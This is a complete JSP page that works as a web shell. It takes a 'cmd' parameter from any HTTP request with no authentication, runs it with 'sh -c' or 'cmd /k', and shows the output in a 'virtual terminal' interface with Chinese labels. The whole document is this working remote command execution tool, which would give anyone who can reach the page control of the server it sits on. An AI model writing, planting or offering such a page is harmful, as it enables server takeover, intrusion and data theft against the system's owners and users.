<%@page import="java.io.*" contentType="text/html; charset=UTF-8" %>
<%@page import="java.lang.StringBuilder" contentType="text/html; charset=UTF-8" %>
<!DOCTYPE html>
<html>
  <head>
    <title>Runtime.getRuntime().exec()</title>
  </head>
  
  <body>

<%!
	void inputProcess(final InputStream in, final JspWriter out, String name){
		//必须是新线程
		new Thread(new Runnable() {
			@Override
			public void run() {
				if(in == null) return;
				try {
					int a = -1;
					byte[] b = new byte[2048];
					while ((a = in.read(b)) != -1) {
						out.println(new String(b));
					}
				} catch (Exception e) {                  
					
				} finally{
					try {
						if(in != null ) in.close();
					} catch (Exception ec) { 
						
					}     
				}
			}
		}, name).start();
	}

	void doInputProcess(InputStream in, JspWriter out){
		inputProcess(in, out, "inputProcess");
	}

	void doErrorProcess(InputStream in, JspWriter out){
		inputProcess(in, out, "errProcess");
	}

	void doOutputProcess(OutputStream out){
		try {
			out.close();//直接关闭流
		} catch (Exception ec) { 
			
		}
	}

%>
<% 
	String cmd = request.getParameter("cmd");
	if(cmd != null && !"".equals(cmd)){
		String[] cmds = new String[]{"sh", "-c", cmd};
		if (System.getProperty("os.name").toLowerCase().contains("windows")) {
			cmds = new String[]{"cmd", "/k", cmd};
		}
		Process ps = null;
		try {
			ps = Runtime.getRuntime().exec(cmds);   
			out.println("start.");
			out.println("<pre>");        
			doInputProcess(ps.getInputStream(), out);
			doErrorProcess(ps.getErrorStream(), out);
			doOutputProcess(ps.getOutputStream());//这句是本例的关键
			ps.waitFor();
			out.println("</pre>");
			out.println("done.");
		} catch (Exception e) {                  
			out.println("err.");
		} finally{
			try {
				if(ps != null) ps.destroy();
			} catch (Exception ec) { 
				
			}     
		}
		return;
	}
	if("true".equals(request.getParameter("c"))){
		return;
	}
	out.println("<div style='margin: 20px'>虚拟终端：<input id='command' type='text' value='netstat -an' style='width: 250px;border: none;color: red;background-color: black;'/>"
		+ "<a style='color: blue' onclick=\"var m= top.document.getElementById('command').value;if(!m) return false; top.document.getElementById('view-file').setAttribute('src', './index.jsp?cmd=' + encodeURIComponent(m));\" href=\"#\">执行</a>"
		+ "</div>");
	out.println("<div style='margin-top: 20px; padding: 5px; height: 500px'>"
		+ "<iframe id='view-file' src='./index.jsp?c=true' height='100%' style='width: 100%; height: 100%' frameborder='0'></iframe>"
		+ "</div>");
%>
  </body>
</html>
